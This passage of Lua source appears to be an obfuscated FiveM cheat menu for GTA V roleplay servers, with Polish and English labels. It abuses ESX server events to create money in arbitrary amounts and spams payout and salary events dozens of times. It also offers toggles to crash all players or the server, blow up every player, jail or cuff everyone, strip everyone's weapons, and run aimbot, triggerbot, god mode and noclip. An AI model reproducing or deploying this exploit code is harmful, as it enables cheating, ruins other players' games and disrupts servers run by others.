				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("SelfMenu") then
				if
					gesraGSRKGoiwsrrswg.CheckBox(
						"~h~~g~God ~h~~r~Mode",
						Godmode,
						function(enabled)
							Godmode = enabled
						end
					)
				 then
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif gesraGSRKGoiwsrrswg.Button("~s~Revive ~h~~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif gesraGSRKGoiwsrrswg.Button("~h~~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif gesraGSRKGoiwsrrswg.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif gesraGSRKGoiwsrrswg.Button("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif gesraGSRKGoiwsrrswg.Button("~w~~h~Set thirst to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif gesraGSRKGoiwsrrswg.Button("~h~~b~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif gesraGSRKGoiwsrrswg.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				gesraGSRKGoiwsrrswg.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				gesraGSRKGoiwsrrswg.CheckBox(
					"~h~Super Jump",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				gesraGSRKGoiwsrrswg.CheckBox(
					"~h~Explosive Punch",
					ePunch,
					function(enabled)
					ePunch = enabled
					end)
				then
				elseif
				gesraGSRKGoiwsrrswg.CheckBox("~h~Fast Run ~r~NEW",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				gesraGSRKGoiwsrrswg.CheckBox(
					"~h~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				gesraGSRKGoiwsrrswg.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("TeleportMenu") then
				if gesraGSRKGoiwsrrswg.Button("~h~Teleport ~h~~g~Waypoint") then
				TeleportToWaypoint()
			 elseif gesraGSRKGoiwsrrswg.Button("~h~Teleport ~h~~g~Vehicle ~r~FIX ") then
					drawNotification("~y~No working wait next update fix")
					local playerPed = GetPlayerPed(-1)
					local playerPedPos = GetEntityCoords(playerPed, true)
					local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
					local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
					local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
					local NearestPlanePos = GetEntityCoords(NearestPlane, true)
				drawNotification("~y~looking for vehicles...")
				Citizen.Wait(1000)
				if (NearestVehicle == 0) and (NearestPlane == 0) then
					drawNotification("~r~No Vehicle Found")
				elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
					if IsVehicleSeatFree(NearestPlane, -1) then
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					end
					drawNotification("~g~Teleported Into Vehicle")
				elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
					if IsVehicleSeatFree(NearestVehicle, -1) then
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					end
					drawNotification("~g~Teleported Into Vehicle")
				elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
					if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
					elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
					end
					drawNotification("~g~Teleported Into Vehicle")
				end
 
			 end

		gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("World") then
			if
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~WH",
				afkasoegpoGUIOESWG,
				function(enabled)
				afkasoegpoGUIOESWG = enabled
				end)
			then
			elseif
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~Znaczniki Graczy na~h~~r~mapie",
				poiytriOGRDUNIDhuthdghd,
				function(enabled)
				poiytriOGRDUNIDhuthdghd = enabled
				end)
			then
			elseif
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~~r~Zniszcz ~s~wszystkie pojazdy",
				aglKSislalhgjna,
				function(enabled)
				aglKSislalhgjna = enabled
				end) 
			then
			elseif
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~~r~Wysadź ~s~wszystkie samochody",
				stoiypstyiuotumkmiotisiu,
				function(enabled)
				stoiypstyiuotumkmiotisiu = enabled
				end) 
			then
			end

		gesraGSRKGoiwsrrswg.Display()
		elseif gesraGSRKGoiwsrrswg.IsMenuOpened("Fuck") then
		if gesraGSRKGoiwsrrswg.Button('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
		end
		if gesraGSRKGoiwsrrswg.Button("~h~~r~Daj wszystkim bronie ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Zabierz Wszystkim Gracza ~s~~h~Bronie") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
		
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
		"~h~~r~Wysadz w powietrze ~s~wszystkich graczy",
		tdgjIDTJHREIUhs,
		function(enabled)
		tdgjIDTJHREIUhs = enabled
	end)
	then
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
		"~h~~r~Scrashuj ~s~wszystkich graczy",
		aefiIUGFbesuGnswagtha,
		function(enabled)
		aefiIUGFbesuGnswagtha = enabled
		end)
	then
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
		"~h~~r~Rozpierdol ~s~ekonomie serwera~g~ESX",
		iuyftzmDHntoyih,
		function(enabled)
		iuyftzmDHntoyih = enabled
		end)
	then
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
		"~h~~r~Wrzuc ~s~wszystkich graczy do wiezienia",
		SGEOSGnioshnigs,
		function(enabled)
		SGEOSGnioshnigs = enabled
		end)
	then
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
		"~h~~r~Zakuj ~s~wszystkich graczy",
		ahsaahcufgagfa,
		function(enabled)
		ahsaahcufgagfa = enabled
	   	end)
	then
	elseif
		gesraGSRKGoiwsrrswg.CheckBox(
			"~h~~r~Crashuj ~s~Server",
			aafrkwnsafjiaugbyGa,
			function(enabled)
				aafrkwnsafjiaugbyGa = enabled
			end)
	then
	end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("WepMenu") then
				if gesraGSRKGoiwsrrswg.MenuButton("~h~Specific Weapon", "SingleWepMenu") then
				elseif gesraGSRKGoiwsrrswg.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif gesraGSRKGoiwsrrswg.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif
					gesraGSRKGoiwsrrswg.ComboBox(
						"~h~Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
			    then
			elseif
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
				then
			elseif
				gesraGSRKGoiwsrrswg.CheckBox(
				"~h~AimBot",
				atrfkorsoiNSIOG,
				function(enabled)
				atrfkorsoiNSIOG = enabled
				end)	
				 then
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
						"~h~Infinite Ammo",
						InfAmmo,
						function(enabled)
							InfAmmo = enabled
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 gesraGSRKGoiwsrrswg.CheckBox("~h~Vehicle Gun",wheisgfvdnbSGBiusGsgs,
				 	 function(enabled)wheisgfvdnbSGBiusGsgs = enabled end) 
			 	then
			 	elseif
					 gesraGSRKGoiwsrrswg.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if gesraGSRKGoiwsrrswg.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("VehMenu") then
				if gesraGSRKGoiwsrrswg.Button("~h~~g~Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~~h~Model is not valid!")
					end
				elseif gesraGSRKGoiwsrrswg.Button("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif gesraGSRKGoiwsrrswg.Button("~h~Max Tuning") then
					uKOTUIOioTUmujjmgj(GetVehiclePedIsUsing(PlayerPedId())
)				elseif gesraGSRKGoiwsrrswg.Button("~h~Max mechanics ~r~new") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
					"~h~Rainbow Vehicle Colour",
					uiURTIJOUJkruioy,
					function(enabled)
					uiURTIJOUJkruioy = enabled
					end)
				then
			    elseif gesraGSRKGoiwsrrswg.Button("~h~~b~Change License Plate~r~ NEW") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end
				elseif gesraGSRKGoiwsrrswg.Button("~h~~r~Delete Vehicle") then
					tuapfoGOISRHIOnsag(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif gesraGSRKGoiwsrrswg.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif gesraGSRKGoiwsrrswg.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
						"~h~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
						"~h~Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
					"~h~Vehicle Speedboost ~g~Num9",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
				elseif
					gesraGSRKGoiwsrrswg.CheckBox(
						"~h~Super Grip",
						supergrip,
						function(enabled)
							supergrip = enabled
						end
					)
				then
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("ServerMenu") then
				if gesraGSRKGoiwsrrswg.MenuButton("~s~Menu ~h~~r~RECRUIT PLAYERS", "RecrutarPlayers") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("ESXBoss") then
				if gesraGSRKGoiwsrrswg.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif gesraGSRKGoiwsrrswg.Button("~g~~h~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

				gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("ESXMoney") then
				if gesraGSRKGoiwsrrswg.Button("~h~~r~-»~r~~h~ BEST MONEY «-") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, CAUTION ~s~1") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, TRUCKER ~s~2") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, ADMIN BANK ~s~3") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, ADMIN ~s~4") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, GOPOSTAL ~s~5") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, BANKSEC ~s~6") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, SLOT ~s~7") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, LSC ~s~8") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, SLOT ~s~9") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, BRUDNA ~s~10") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, TRUCKERJOB ~s~11") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, DOSTAWA ~s~12") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, TAXI(WYBOR) ~s~13") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, TAXI ~s~14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, GARBAGEJOB ~s~15") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif gesraGSRKGoiwsrrswg.Button("~g~~h~MONEY, WYPLATA ~s~16") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
